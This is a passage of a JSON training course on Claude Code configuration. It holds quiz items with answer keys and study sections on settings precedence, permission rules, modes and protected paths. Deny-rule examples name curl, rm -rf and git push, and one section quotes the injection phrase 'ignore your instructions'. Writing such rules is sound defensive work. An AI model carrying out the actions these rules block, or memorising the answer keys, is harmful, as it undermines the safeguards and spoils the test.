    "id": "stage-1-q5",
    "type": "multiple-choice",
    "prompt": "A teammate types `#  Always use pnpm instead of npm` in the Claude chat. Where does Claude store this, and what can a team member expect about its availability?",
    "options": [
     "Claude appends it to the project `CLAUDE.md`, making it available to all teammates on next pull.",
     "Claude stores it in auto-memory (`MEMORY.md`) under `~/.claude/projects/<project>/memory/`. It is machine-local and not synced across machines.",
     "Claude stores it in `~/.claude/CLAUDE.md`, making it a cross-project user preference that applies everywhere.",
     "Claude discards `#` lines as comments; the teammate should use `/memory` instead."
    ],
    "correct": 1,
    "explanation": "The content states: '`# <text>` quick-add / \"remember this\" / \"always use pnpm\" goes to **AUTO MEMORY, not CLAUDE.md**' and 'Machine-local — not synced across machines or cloud.' The shortcut stores to auto-memory, which is scoped to the user's machine. Option A is wrong — the `#` shortcut targets auto-memory, not CLAUDE.md; to update CLAUDE.md, you must ask explicitly. Option C is wrong — auto-memory is project-scoped, not cross-project user settings. Option D is wrong — `# ` is the defined quick-add syntax for auto-memory."
   },
   {
    "id": "stage-1-q6",
    "type": "multiple-choice",
    "prompt": "You update `env.MY_TOKEN` in `.claude/settings.json` while Claude is already running. When will Claude pick up the new value?",
    "options": [
     "Immediately — settings.json changes take effect after a brief file-stability delay without a restart.",
     "After running `/hooks` in the current session to reload configuration.",
     "Only after restarting `claude` — env vars are read at startup only.",
     "Immediately, but only for newly spawned subagents, not the current session."
    ],
    "correct": 2,
    "explanation": "The content states: 'Edits to settings.json take effect after a brief file-stability delay (no restart); env vars are read **at startup only** (restart `claude` to apply).' There is an important split: non-env settings reload without restart, but env vars require a restart. Option A is partially true for hooks/permissions but not for env vars. Option B is wrong — `/hooks` shows current hook definitions but does not reload env vars. Option D invents a subagent-specific behavior not described in the content."
   },
   {
    "id": "stage-1-q7",
    "type": "multiple-choice",
    "prompt": "After a `/compact` operation, Claude seems to have forgotten the coding conventions from a subdirectory `src/api/CLAUDE.md` that were active earlier in the conversation. The project-root `CLAUDE.md` instructions are still followed. What explains this behavior?",
    "options": [
     "Subdirectory CLAUDE.md files are truncated first during compaction to save context space.",
     "Project-root `CLAUDE.md` survives `/compact` (re-injected from disk), but subdirectory CLAUDE.md files are NOT re-injected — they reload only on the next file read in that subdirectory.",
     "The subdirectory CLAUDE.md was never loaded to begin with; subdirectory files only load for write operations.",
     "Compaction clears all CLAUDE.md files including the root; the root instructions survived only because Claude cached them before compaction."
    ],
    "correct": 1,
    "explanation": "The content states: 'Project-root CLAUDE.md survives `/compact` (re-read from disk, re-injected). **Nested subdirectory CLAUDE.md and conversation-only instructions are NOT re-injected** — they reload only on the next file read in that subdir.' Option A invents a truncation-priority scheme not described in the content. Option C is wrong in two ways: subdirectory files do load before compaction (when Claude reads a file there), and they load on Read not Write. Option D is wrong — the root CLAUDE.md is actively re-read from disk after compaction, not cached."
   },
   {
    "id": "stage-1-q8",
    "type": "multi-select",
    "prompt": "Your org wants certain rules to be impossible for any individual developer to override — not through personal settings, not through project settings, not through CLI flags. Select ALL approaches that achieve this.",
    "options": [
     "Add the rules to `permissions.deny` in the team `.claude/settings.json`.",
     "Deploy the rules in managed settings (`managed-settings.json` in the system directory).",
     "Add the rules to each developer's `~/.claude/settings.json` via onboarding scripts.",
     "Deploy a managed CLAUDE.md at the managed policy path (e.g., `/etc/claude-code/CLAUDE.md` on Linux).",
     "Add the rules to CLAUDE.md with a prominent heading stating they are mandatory."
    ],
    "correct": [
     1,
     3
    ],
    "explanation": "Managed settings (`managed-settings.json`) are at the top of the precedence chain and 'always wins, even over CLI flags' — this is the correct enforcement mechanism. The managed CLAUDE.md at the system path (e.g., `/etc/claude-code/CLAUDE.md`) is also loaded first and 'Cannot [be] exclude[d]' unlike project-level CLAUDE.md files. Option A (project deny) can be overridden by managed allow or by developers removing the file from their fork. Option C (personal settings) can be overridden by the developer themselves. Option E is wrong because 'CLAUDE.md is not enforcement' — the content explicitly warns: 'use CLAUDE.md for \"we do it this way\" guidance; use permissions/hooks for security boundaries and anything that must never happen — CLAUDE.md is not enforcement.'"
   },
   {
    "id": "stage-1-q9",
    "type": "multi-select",
    "prompt": "A teammate asks what should go in the committed `.claude/settings.json` (project-level, source-controlled) vs what should stay in `.claude/settings.local.json` (gitignored). Select ALL items that belong in the committed `.claude/settings.json`.",
    "options": [
     "Team-wide `permissions.allow` rules (e.g., `Bash(npm run test *)`).",
     "A developer's personal API key stored as an `env` variable.",
     "Hooks that enforce team code-quality gates (e.g., run linter before commit).",
     "The developer's personal model preference that differs from the team default.",
     "Approved team MCP servers — wait, those go in `.mcp.json`, not `settings.json`."
    ],
    "correct": [
     0,
     2,
     4
    ],
    "explanation": "Team-wide permissions (A) and shared hooks (C) are exactly what project `settings.json` is for — they should be committed so all teammates get them. Option E is the correct placement nuance: MCP servers go in `.mcp.json` at the repo root, not in `settings.json`. Personal API keys (B) should never be committed — they belong in a gitignored local file or environment. A personal model preference (D) is a per-developer override and belongs in `settings.local.json` or `~/.claude/settings.json`. The content lists: 'Keep gitignored / personal: `.claude/settings.local.json`'."
   },
   {
    "id": "stage-1-q10",
    "type": "multiple-choice",
    "prompt": "A monorepo has three teams. Team A's CLAUDE.md at the repo root contains frontend-specific build commands that confuse the backend agents working in `services/`. A backend developer wants to suppress loading Team A's CLAUDE.md for their sessions without removing the file. What is the correct mechanism?",
    "options": [
     "Add a `CLAUDE.md` in `services/` that contradicts Team A's instructions; the more specific file wins.",
     "Use `claudeMdExcludes` in `.claude/settings.local.json` with a glob pattern matching Team A's CLAUDE.md path.",
     "Rename Team A's file to `CLAUDE.team-a.md`; Claude only loads files named exactly `CLAUDE.md`.",
     "Move the instructions into `.claude/rules/` with a `paths:` frontmatter glob scoped to frontend directories."
    ],
    "correct": 1,
    "explanation": "The content states: 'In monorepos, use `claudeMdExcludes` in `.claude/settings.local.json` to skip other teams' ancestor CLAUDE.md files.' `claudeMdExcludes` takes string[] globs and 'skip[s] loading ancestor CLAUDE.md/rules; matched against absolute paths.' Option A would add conflicting instructions but not suppress loading — the confusion would persist. Option C is wrong — renaming is a destructive change that affects everyone and is not the described mechanism. Option D is a good practice for Team A to adopt going forward but doesn't solve the current developer's problem of suppressing an existing file."
   },
   {
    "id": "stage-1-q11",
    "type": "multiple-choice",
    "prompt": "You write a CLAUDE.md import: `@../shared/team-standards.md`. The import is in `frontend/CLAUDE.md`. From which directory does Claude resolve the path `../shared/team-standards.md`?",
    "options": [
     "The current working directory where Claude was launched.",
     "The project root (where `.git` lives).",
     "The directory containing `frontend/CLAUDE.md` (i.e., the `frontend/` directory).",
     "The user's home directory `~/.claude/`."
    ],
    "correct": 2,
    "explanation": "The content states: 'relative paths resolve **relative to the file containing the import, NOT cwd**.' So `../shared/team-standards.md` resolves relative to `frontend/`, yielding `shared/team-standards.md` at the project root level. Option A is a common mistake — developers often assume imports resolve from where Claude is launched. Option B is wrong — the resolution is file-relative, not project-root-relative. Option D is obviously wrong but catches anyone who conflates CLAUDE.md imports with global user config."
   },
   {
    "id": "stage-1-q12",
    "type": "multiple-choice",
    "prompt": "A developer adds `permissions: { allow: [\"Bash(npm run build *)\"] }` to `~/.claude.json` because they want it to apply across all projects. After restarting Claude, the permission never takes effect. What is wrong?",
    "options": [
     "`~/.claude.json` requires a `version` field; without it, permissions blocks are ignored.",
     "`~/.claude.json` is not a settings file — it holds app state and OAuth session. Permissions placed there are silently ignored; they belong in `~/.claude/settings.json`.",
     "Cross-project permissions must be placed in the managed `managed-settings.json`, not in personal files.",
     "The `Bash(npm run build *)` syntax is incorrect; the correct form is `Bash(\"npm run build *\")`."
    ],
    "correct": 1,
    "explanation": "The content states: '**`~/.claude.json` is NOT a settings file** — it holds app state, theme, OAuth session, per-project trust, personal MCP servers, UI toggles. Putting `permissions`/`hooks`/`env` there is **silently ignored** (they belong in `~/.claude/settings.json`).' This is one of the most common misconfigurations. Option A invents a `version` field requirement not mentioned in the content. Option C is wrong — personal cross-project permissions go in `~/.claude/settings.json`, not managed settings (which are org-controlled). Option D is wrong — the Bash permission syntax shown is consistent with the content's examples."
   },
   {
    "id": "stage-1-q13",
    "type": "multiple-choice",
    "prompt": "Your team delegates a task to the built-in Explore subagent. The subagent ignores a critical instruction that is clearly written in the project CLAUDE.md. No other agent has this problem. What is the most likely cause?",
    "options": [
     "The Explore subagent only reads CLAUDE.md once at launch; if CLAUDE.md was updated mid-session, the subagent uses a stale version.",
     "Built-in Explore and Plan subagents skip CLAUDE.md; critical instructions must be restated in the delegating prompt.",
     "The subagent encountered the 200-line CLAUDE.md limit and the instruction was past line 200.",
     "The Explore subagent reads `CLAUDE.local.md` but not `CLAUDE.md`; the instruction should be in the local file."
    ],
    "correct": 1,
    "explanation": "The content states: 'Built-in **Explore and Plan subagents skip CLAUDE.md** — restate critical instructions in the delegating prompt.' This is a known gotcha for the specific built-in subagents. Custom subagents behave differently (they load CLAUDE.md). Option A invents a stale-version behavior; CLAUDE.md is re-read from disk. Option C confuses the 200-line adherence guideline with the MEMORY.md cap; CLAUDE.md loads in full regardless. Option D inverts the real behavior — it is the built-in subagents that skip CLAUDE.md, not a file-naming issue."
   },
   {
    "id": "stage-1-q14",
    "type": "multiple-choice",
    "prompt": "Claude is launched from the `frontend/components/` subdirectory of a monorepo. Which CLAUDE.md files are loaded at session start?",
    "options": [
     "Only `frontend/components/CLAUDE.md`, because Claude uses the cwd as the sole source.",
     "All CLAUDE.md files found by walking UP the directory tree from `frontend/components/`, plus the user and managed CLAUDE.md; subdirectory CLAUDE.md files BELOW cwd are not loaded at launch.",
     "All CLAUDE.md files in the entire repo, including those in sibling subdirectories like `frontend/utils/`.",
     "The project-root CLAUDE.md only; ancestor and subdirectory files are ignored."
    ],
    "correct": 1,
    "explanation": "The content states: 'Discovery **walks UP the directory tree** from cwd, loading every `CLAUDE.md` + `CLAUDE.local.md` found; all are concatenated (root-down, so the file closest to launch dir is read LAST).' It also states: '**Subdirectory (below cwd) CLAUDE.md files are NOT loaded at launch**.' Plus the user (`~/.claude/CLAUDE.md`) and managed policy CLAUDE.md are also in the load order. Option A is wrong — the walk goes upward, not just cwd. Option C is wrong — sibling and deeper subdirectories are not loaded at launch. Option D is wrong — ancestor directories are included in the upward walk."
   },
   {
    "id": "stage-1-q15",
    "type": "multi-select",
    "prompt": "You are reviewing onboarding docs for a new project. Which of the following claims about CLAUDE.md imports are CORRECT? Select all that apply.",
    "options": [
     "An import of `@shared/docs/standards.md` in `.claude/CLAUDE.md` resolves `shared/docs/standards.md` relative to the `.claude/` directory.",
     "Imports do not save context — imported files fully expand into context at launch.",
     "Wrapping a path in backticks (e.g., `` `@README` ``) prevents Claude from treating it as an import.",
     "If a developer declines the external import approval dialog, imports are permanently disabled for that project and the dialog never reappears.",
     "Path-scoped rules (`.claude/rules/*.md` with `paths:` frontmatter) defer loading, unlike imports which expand at launch."
    ],
    "correct": [
     0,
     1,
     2,
     3,
     4
    ],
    "explanation": "All five claims are correct and grounded in the content. (A) Relative paths resolve relative to the file containing the import. (B) 'Imports **do NOT save context** — imported files fully expand into context at launch.' (C) 'Import parsing skips Markdown code spans/fenced blocks; wrap a path in backticks to mention it literally.' (D) 'First time a project hits external imports, an approval dialog appears; **declining permanently disables imports for that project** (dialog never reappears).' (E) Path-scoped rules with `paths:` 'load only when Claude reads a matching file,' while imports expand at launch — this contrast is explicit in the content."
   }
  ],
  "masteryCheckpoint": "You can explain the concepts of Config & memory (CLAUDE.md, settings)."
 },
 {
  "id": "stage-2",
  "stage": 2,
  "title": "Permissions, security & governance",
  "summary": "Permissions, security & governance: settings scope precedence, deny/ask/allow rule evaluation, enforcement vs guidance.",
  "prerequisites": [
   "stage-1"
  ],
  "objectives": [
   "Understand the concepts in Permissions, security & governance."
  ],
  "definitions": [
   {
    "term": "settings scope precedence",
    "short": "The ranked layering of config sources (managed > CLI args > local project > shared project > user) that decides which value wins."
   },
   {
    "term": "deny/ask/allow rule evaluation",
    "short": "Permission rules are evaluated in the fixed order deny then ask then allow, with first match winning regardless of how specific a rule is."
   },
   {
    "term": "enforcement vs guidance",
    "short": "CLAUDE.md and prompts only shape what Claude tries to do; only permission rules, modes, hooks, and sandboxes actually grant or revoke access."
   },
   {
    "term": "permission modes",
    "short": "Named operating profiles (default, acceptEdits, plan, auto, dontAsk, bypassPermissions) that set the baseline prompting behavior for tool calls."
   },
   {
    "term": "protected paths",
    "short": "A built-in set of sensitive dirs and files (like .git, .claude, shell rc files, .mcp.json) whose writes are never auto-approved in any mode except bypass, even by allow rules."
   },
   {
    "term": "permission rule syntax",
    "short": "The Tool(specifier) matching language with space-as-word-boundary wildcards, compound-command awareness, and path anchors that determines exactly which tool calls a rule covers."
   }
  ],
  "sections": [
   {
    "heading": "Why This Layer Exists",
    "body": "When a team deploys shared Claude Code infrastructure, they face three distinct problems that are easy to conflate:\n\n1. **Configuration management**: which settings win when a user's `~/.claude/settings.json` disagrees with the project's `.claude/settings.json` and the IT-deployed policy file?\n2. **Access control**: which Bash commands, files, and network domains can Claude actually touch — and who decides?\n3. **Data governance**: does your company's code end up in Anthropic's training set?\n\nThese map to three mechanisms: the **settings scope hierarchy** (answers problem 1), the **permission system** (answers problem 2), and the **commercial account terms** (answers problem 3). Understanding the distinction matters because they are NOT substitutes for each other. A thoughtful `CLAUDE.md` can tell Claude to avoid deleting files; that is not the same as a deny rule that prevents it. A user-level allow rule can be silently overridden by a managed deny rule. And running personal Claude Free/Pro/Max accounts on company code is a governance failure no config file fixes."
   },
   {
    "heading": "Settings Scope Precedence: The Five-Layer Stack",
    "body": "Claude Code resolves every configuration key through a fixed priority order. When the same key appears in multiple places, the **first (highest) match wins**:\n\n| Priority | Scope | Location | Overridable? |\n|----------|-------|----------|--------------|\n| 1 (highest) | **Managed** | System-level paths below | No — cannot be overridden by any lower scope, including CLI args |\n| 2 | **CLI arguments** | `--permission-mode`, `--model`, etc. | Yes, by managed only |\n| 3 | **Local project** | `.claude/settings.local.json` | By managed + CLI args |\n| 4 | **Shared project** | `.claude/settings.json` | By managed + CLI args + local |\n| 5 (lowest) | **User** | `~/.claude/settings.json` | By everything above |\n\n### Managed settings deployment paths\n\nManaged settings are delivered via MDM or written to system-level directories that normal users cannot write to:\n\n```\n# macOS\n/Library/Application Support/ClaudeCode/managed-settings.json\n/Library/Application Support/ClaudeCode/managed-settings.d/*.json   # drop-ins\n# MDM plist domain: com.anthropic.claudecode\n\n# Linux / WSL\n/etc/claude-code/managed-settings.json\n/etc/claude-code/managed-settings.d/*.json\n\n# Windows\nC:\\Program Files\\ClaudeCode\\managed-settings.json\nC:\\Program Files\\ClaudeCode\\managed-settings.d\\*.json\nHKLM\\SOFTWARE\\Policies\\ClaudeCode   # Group Policy / Intune\nHKCU\\SOFTWARE\\Policies\\ClaudeCode   # user-level registry, lowest managed priority\n```\n\nFiles in `managed-settings.d/` are merged alphabetically after the base file. Arrays concatenate and deduplicate; objects deep-merge; scalar values from later files override earlier ones. Use numeric prefixes for predictable ordering: `10-telemetry.json`, `20-security.json`.\n\n### The critical exception: permission rules merge, not override\n\nFor most settings (model, defaultMode, env vars), the highest-priority scope wins and lower scopes are ignored. Permission rules are different: **deny, ask, and allow lists are merged across all scopes into a single unified list.** This has a non-obvious consequence:\n\n> If a tool is denied at any scope level, no lower scope can allow it.\n\nA managed-level `deny: [\"Bash(curl *)\"]` cannot be overridden by a project-level `allow: [\"Bash(curl *)\"]`. The deny wins. The reverse is also true: a user-level deny blocks a project-level allow. This is intentional — deny rules from any scope are evaluated before allow rules from any scope.\n\n### What goes where: committed vs personal files\n\n| Concern | File | Committed to git? | Why |\n|---------|------|--------------------|-----|\n| Team-wide allow rules (safe CI commands) | `.claude/settings.json` | Yes | All devs inherit the same approved toolset |\n| Team-wide deny rules (no production deploys) | `.claude/settings.json` | Yes | Consistently enforced across the repo |\n| Default mode for the project | `.claude/settings.json` | Yes | Reproducible behavior for all contributors |\n| Personal allow rules (your preferred linter) | `~/.claude/settings.json` | No — user scope | Your workflow, not the team's |\n| Machine-specific overrides (sandbox on this laptop) | `.claude/settings.local.json` | No — gitignored | Laptop-specific config |\n| Org-wide security policy | `managed-settings.json` (via IT/MDM) | No — system-level | Cannot be overridden by any developer |\n\nOn Windows, `~/.claude` resolves to `%USERPROFILE%\\.claude`."
   },
   {
    "heading": "Permission Rule Syntax: The Tool(specifier) Language",
    "body": "Every permission rule has the form `Tool` or `Tool(specifier)`. The tool name is the canonical name as used in the tools reference (e.g., `Bash`, `Read`, `Edit`, `WebFetch`, `WebSearch`, `Agent`, `mcp__<server>__<tool>`). Permission rules match against canonical tool names — the label shown in the transcript may differ from the canonical name used in rules.\n\n### Matching all uses vs. specific uses\n\n```json\n// Match ALL uses of a tool\n{ \"permissions\": { \"deny\": [\"WebSearch\"] } }\n\n// Match SPECIFIC uses\n{ \"permissions\": {\n    \"allow\": [\n      \"Bash(npm run test *)\",\n      \"Read(~/.zshrc)\",\n      \"WebFetch(domain:example.com)\"\n    ]\n} }\n```\n\nA bare tool name like `Bash` (no parentheses) and `Bash(*)` are equivalent — both match every invocation. As a deny rule, both forms **remove the tool from Claude's context entirely**, so Claude never sees it or tries to use it. A scoped rule like `Bash(rm *)` leaves the tool available but blocks matching calls.\n\n### Wildcard semantics for Bash rules\n\nThe `*` wildcard matches any sequence of characters including spaces. One wildcard can span multiple arguments. Position matters:\n\n```\nBash(ls *)      → matches \"ls -la\" but NOT \"lsof\"  (space enforces word boundary)\nBash(ls*)       → matches both \"ls -la\" AND \"lsof\"  (no word boundary)\nBash(npm run *) → matches any npm run subcommand\nBash(git * main)→ matches \"git checkout main\", \"git push origin main\"\nBash(* --help *) → matches any command with --help anywhere in it\n```\n\nThe `:*` suffix is an equivalent shorthand for a trailing wildcard: `Bash(ls:*)` matches the same commands as `Bash(ls *)`. The `:*` form is only recognized at the end of a pattern; a colon elsewhere is treated as a literal character.\n\n### Compound command awareness\n\nThis is a critical security property. Claude Code parses shell operators and checks **each subcommand independently**. A rule like `Bash(safe-cmd *)` does **not** grant permission to `safe-cmd && rm -rf .`.\n\nRecognized separators: `&&`, `||`, `;`, `|`, `|&`, `&`, and newlines. A compound command is allowed only if every subcommand independently matches an allow rule (and none matches a deny rule).\n\nWhen you approve a compound command interactively with \"Yes, don't ask again\", Claude Code saves a separate rule per subcommand (up to 5 rules), not one rule for the whole string.\n\n### Process wrapper stripping\n\nBefore matching Bash rules, Claude Code strips a fixed set of process wrappers so `Bash(npm test *)` also matches `timeout 30 npm test *`. Recognized wrappers: `timeout`, `time`, `nice`, `nohup`, `stdbuf`. Bare `xargs` (no flags) is also stripped.\n\nDev environment runners like `npx`, `devbox run`, `mise exec`, and `docker exec` are NOT stripped. A rule like `Bash(devbox run *)` matches whatever follows `run`, including dangerous subcommands. Write specific rules: `Bash(devbox run npm test)`.\n\nExec wrappers such as `watch`, `setsid`, `ionice`, and `flock` always prompt and cannot be auto-approved by a prefix rule. The same applies to `find` with `-exec` or `-delete`.\n\n### Path anchors for Read/Edit rules\n\nRead and Edit rules follow gitignore pattern semantics with four distinct anchors:\n\n| Prefix | Anchored to | Example |\n|--------|-------------|--------|\n| `//path` | Filesystem root (absolute) | `Read(//home/alice/.ssh/**)` |\n| `~/path` | Home directory | `Read(~/.aws/credentials)` |\n| `/path` | Project root | `Edit(/src/**/*.ts)` |\n| `path` or `./path` | Current working directory | `Read(.env)` |\n\nCommon gotcha: `/Users/alice/file` is NOT an absolute path in this system — it means `<project root>/Users/alice/file`. Use `//Users/alice/file` for filesystem-absolute paths.\n\nBare filenames like `Read(.env)` and `Read(**/.env)` are equivalent in gitignore semantics: both match `.env` at any depth under the current directory.\n\nNote: `*` matches within a single path segment; `**` matches across directories.\n\n### Symlink behavior\n\nWhen Claude accesses a symlink, permission rules check both the symlink path and its resolved target:\n\n- **Allow rules**: apply only when both the symlink path and its target match. A symlink inside an allowed directory that points outside it still prompts.\n- **Deny rules**: apply when either the symlink path or its target matches. A symlink pointing to a denied file is itself denied.\n\n### WebFetch domain rules\n\n```json\n\"WebFetch(domain:example.com)\"      // exact domain, case-insensitive\n\"WebFetch(domain:*.example.com)\"    // any subdomain at any depth (not example.com itself)\n\"WebFetch(domain:*)\"                 // all domains (same as bare WebFetch)\n```\n\nA trailing wildcard in the last domain label only matches within one label: `domain:example.*` matches `example.org` but not `example.evil.com`.\n\n### MCP tool rules\n\n```json\n// Deny / ask rules — accept tool-name globs:\n\"mcp__*\"                               // all MCP tools across all servers (deny/ask only)\n\n// Allow rules — require literal server prefix:\n\"mcp__puppeteer__puppeteer_navigate\"  // specific tool on specific server\n\"mcp__puppeteer__*\"                    // all tools on puppeteer server\n```\n\nFor allow rules, a glob must include a literal `mcp__<server>__` prefix. An unanchored allow glob such as `\"*\"`, `\"B*\"`, or `\"mcp__*\"` is skipped with a startup warning and does not auto-approve anything.\n\n### Parameter-based matching (deny/ask only)\n\nDeny and ask rules can gate on any top-level scalar parameter with `Tool(param:value)`:\n\n```json\n\"deny\": [\n  \"Agent(model:opus)\",          // block Agent calls requesting the Opus model tier\n  \"Bash(run_in_background:true)\" // block background Bash runs\n]\n```\n\nThis syntax is not available for allow rules (a single matching parameter does not establish overall safety).\n\n### URL-filtering fragility warning\n\nBash URL-filtering rules are brittle:\n```\n# Intended to restrict curl to GitHub — DOES NOT WORK reliably:\nBash(curl http://github.com/ *)\n# Fails for: -X GET http://..., https://..., URL variables, redirects, extra spaces\n```\n\nPrefer: deny `Bash(curl *)` entirely and use `WebFetch(domain:github.com)` allow rules for controlled fetching. Note that using `WebFetch` allow rules alone does not prevent network access through Bash if Bash itself is unrestricted."
   },
   {
    "heading": "Deny/Ask/Allow Evaluation: First Match Wins, Order Is Fixed",
    "body": "Permission rules are evaluated in a fixed three-step order regardless of rule specificity:\n\n```\n1. DENY  → first match → BLOCK (tool call rejected)\n2. ASK   → first match → PROMPT user for approval\n3. ALLOW → first match → PERMIT (tool call proceeds)\n4. (no match) → default behavior for the current permission mode\n```\n\nRule specificity does **not** change evaluation order. A broad deny like `Bash(aws *)` blocks every matching call, **including calls that also match a narrower allow like `Bash(aws s3 ls)`**. There is no \"more specific allow overrides broader deny\" logic. Deny rules cannot carry allowlist exceptions.\n\nThe same applies to ask vs allow: a matching ask rule prompts even when a more specific allow rule also matches the same call.\n\n### Cross-scope deny always wins\n\nBecause rules merge across scopes and deny is checked first, a deny at any scope blocks a matching allow at any other scope:\n\n```json\n// managed-settings.json (IT-deployed)\n{ \"permissions\": { \"deny\": [\"Bash(terraform apply *)\"] } }\n\n// .claude/settings.json (developer-committed)\n{ \"permissions\": { \"allow\": [\"Bash(terraform apply *)\"] } }  // ← IGNORED, deny wins\n```\n\n### Read-only commands bypass the evaluation pipeline\n\nA built-in set of Bash commands is treated as read-only and runs without any permission prompt in every mode. These include: `ls`, `cat`, `echo`, `pwd`, `head`, `tail`, `grep`, `find`, `wc`, `which`, `diff`, `stat`, `du`, `cd` (into the working directory or an additional directory), and read-only forms of `git`. The set is not configurable. To force a prompt for one of these, add an explicit `ask` or `deny` rule.\n\nUnquoted glob patterns are permitted for commands whose every flag is read-only, so `ls *.ts` and `wc -l src/*.py` run without a prompt. Commands with write-capable flags (`find`, `sort`, `sed`, `git`) still prompt when an unquoted glob is present.\n\n### How hooks interact with rule evaluation\n\nPreToolUse hooks run before the permission prompt:\n\n- A hook that **exits with code 2** blocks the tool call before permission rules are evaluated — the block applies even when an allow rule would otherwise permit it.\n- If a hook returns allow or ask, **deny and ask rules are still evaluated**. A hook returning allow cannot bypass a deny rule; matching deny rules still block the call.\n\nThis preserves deny-first precedence, including deny rules set in managed settings."
   },
   {
    "heading": "Enforcement vs. Guidance: The Most Misunderstood Distinction",
    "body": "The permissions documentation states this explicitly and it deserves emphasis:\n\n> \"Permission rules are enforced by Claude Code, not by the model. Instructions in your prompt or CLAUDE.md shape what Claude *tries* to do, but they don't change what Claude Code *allows*.\"\n\nThis creates two distinct security surfaces that teams routinely conflate:\n\n### What provides guidance (shapes intent, does not enforce)\n\n- **`CLAUDE.md` instructions**: \"Never delete files without confirmation\", \"Do not push to main\" — Claude reads and tries to follow these, but nothing in the runtime prevents a violation\n- **System prompts**: Same — behavioral shaping, not enforcement\n- **Conversational reminders**: \"remember not to...\" — no enforcement\n- **The model's own judgment**: Claude may decline to do something harmful, but this is not a reliable security gate\n\n### What provides enforcement (actually grants or revokes access)\n\n- **Permission rules** (`deny`, `ask`, `allow` in settings files)\n- **Permission modes** (set the baseline prompting behavior)\n- **Protected paths** (built-in always-blocked list)\n- **PreToolUse hooks** (can block tool calls with exit code 2, before rules are evaluated)\n- **Bash sandbox** (OS-level process isolation — the only real enforcement boundary for subprocess behavior)\n- **Managed settings** (cannot be overridden by any developer action)\n\n### The practical implication\n\nIf your threat model is \"Claude should never push to production\", a `CLAUDE.md` note is not sufficient. You need:\n\n```json\n// .claude/settings.json or managed-settings.json\n{ \"permissions\": { \"deny\": [\"Bash(git push *)\", \"Bash(* deploy *)\"] } }\n```\n\nFor CI pipelines with `--permission-mode dontAsk`, `CLAUDE.md` instructions are irrelevant to what Claude can actually do — only pre-approved allow rules matter.\n\nThis distinction also means that a prompt injection attack that convinces Claude to \"ignore your instructions\" cannot override deny rules or managed settings. The permission system is evaluated by Claude Code's runtime, not by the model reading the conversation."
   },
   {
    "heading": "Permission Modes: Six Named Operating Profiles",
    "body": "Permission modes set the baseline prompting behavior for every tool call. Deny and ask rules apply in every mode. The mode determines what happens when no specific rule matches.\n\n| Mode | What runs without prompting | Best for |\n|------|-----------------------------|-----------|\n| `default` | Reads only | Getting started, sensitive work |\n| `acceptEdits` | Reads + file edits + `mkdir`, `touch`, `rm`, `rmdir`, `mv`, `cp`, `sed` on in-scope paths | Iterating on code you're reviewing |\n| `plan` | Reads only; no file edits | Exploring a codebase before changing it |\n| `auto` | Everything, with background classifier safety checks | Long tasks, reducing prompt fatigue |\n| `dontAsk` | Only pre-approved allow-rule matches and read-only commands | Locked-down CI and scripts |\n| `bypassPermissions` | Everything including protected paths | Isolated containers / VMs only |\n\nIn every mode except `bypassPermissions`, writes to protected paths are never auto-approved.\n\n### How to activate modes\n\n```bash\n# Single session (CLI flag)\nclaude --permission-mode acceptEdits\n\n# Cycle modes mid-session with Shift+Tab\n# Default cycle: default → acceptEdits → plan\n# auto: appears in cycle when account meets requirements (shows opt-in prompt first)\n# bypassPermissions: appears in cycle only after starting with --permission-mode bypassPermissions\n#                    or --allow-dangerously-skip-permissions\n# dontAsk: never appears in cycle; set via --permission-mode dontAsk flag only\n\n# Set as default in settings\n# .claude/settings.json or ~/.claude/settings.json:\n{\n  \"permissions\": {\n    \"defaultMode\": \"acceptEdits\"\n  }\n}\n```\n\n### Mode-specific behaviors and gotchas\n\n**`acceptEdits`**: Auto-approves `mkdir`, `touch`, `rm`, `rmdir`, `mv`, `cp`, and `sed` for paths inside the working directory or `additionalDirectories`. These are also auto-approved when prefixed with safe environment variables like `LANG=C` or process wrappers like `timeout` and `nice`. Paths outside scope and writes to protected paths still prompt.\n\n**`plan`**: Claude reads and explores but does not edit source files. To exit plan mode, press `Shift+Tab` again. Prefixing a single prompt with `/plan` enters plan mode for that prompt only.\n\n**`auto`**: See the Auto Mode Classifier section below. `defaultMode: \"auto\"` is ignored in `.claude/settings.json` and `.claude/settings.local.json` — a repository cannot grant itself auto mode. Place it in `~/.claude/settings.json` or managed settings.\n\n**`dontAsk`**: Auto-denies every tool call that would otherwise prompt, including explicit ask rules (which are denied rather than prompted). Useful for CI where you pre-define the full allow list and want fail-closed behavior for anything unexpected.\n\n**`bypassPermissions`**: Disables permission prompts and protected-path checks. Explicit ask rules still force a prompt, and `rm -rf /` / `rm -rf ~` still prompt as a circuit breaker. Cannot be entered from a session started without an enabling flag (`--permission-mode bypassPermissions` or `--dangerously-skip-permissions`). Blocked when running as root or under `sudo` on Linux and macOS (the check is skipped inside a recognized sandbox).\n\nAdministrators can disable bypass or auto mode organization-wide:\n\n```json\n// managed-settings.json (or any scope for disableBypassPermissionsMode)\n{\n  \"permissions\": {\n    \"disableBypassPermissionsMode\": \"disable\",\n    \"disableAutoMode\": \"disable\"\n  }\n}\n```\n\n`disableBypassPermissionsMode` works from any settings scope; `disableAutoMode` is typically placed in managed settings. Both take the value `\"disable\"`."
   },
   {
    "heading": "Protected Paths: The Built-in Always-Blocked List",
    "body": "Claude Code maintains a built-in set of paths whose writes are never auto-approved in any mode except `bypassPermissions`. This prevents accidental corruption of repository state and Claude's own configuration. Allow rules in settings files do not pre-approve these paths — the safety check runs before allow rule evaluation in the settings system.\n\n### Protected directories\n\n```\n.git\n.config/git\n.vscode\n.idea\n.husky\n.cargo\n.devcontainer\n.yarn\n.mvn\n.claude              (exception: .claude/worktrees is writable — Claude stores its own git worktrees there)\n```\n\n### Protected files\n\n```\n# Git config\n.gitconfig  .gitmodules\n\n# Shell init files\n.bashrc  .bash_profile  .bash_login  .bash_aliases  .bash_logout\n.zshrc   .zprofile      .zshenv      .zlogin        .zlogout\n.profile  .envrc\n\n# Package manager config\n.npmrc  .yarnrc  .yarnrc.yml  .pnp.cjs  .pnp.loader.mjs  .pnpmfile.cjs\nbunfig.toml  .bunfig.toml\n\n# Build/task runner config\n.bazelrc  .bazelversion  .bazeliskrc\n.pre-commit-config.yaml\nlefthook.yml  lefthook.yaml  .lefthook.yml  .lefthook.yaml\ngradle-wrapper.properties  maven-wrapper.properties\n\n# Dev environment / IDE\n.devcontainer.json\n.ripgreprc  pyrightconfig.json\n\n# Claude Code config\n.mcp.json  .claude.json\n```\n\n### Per-mode behavior\n\n| Mode | What happens on a protected-path write |\n|------|----------------------------------------|\n| `default`, `acceptEdits`, `plan` | Prompted (even in acceptEdits, which otherwise auto-approves file edits) 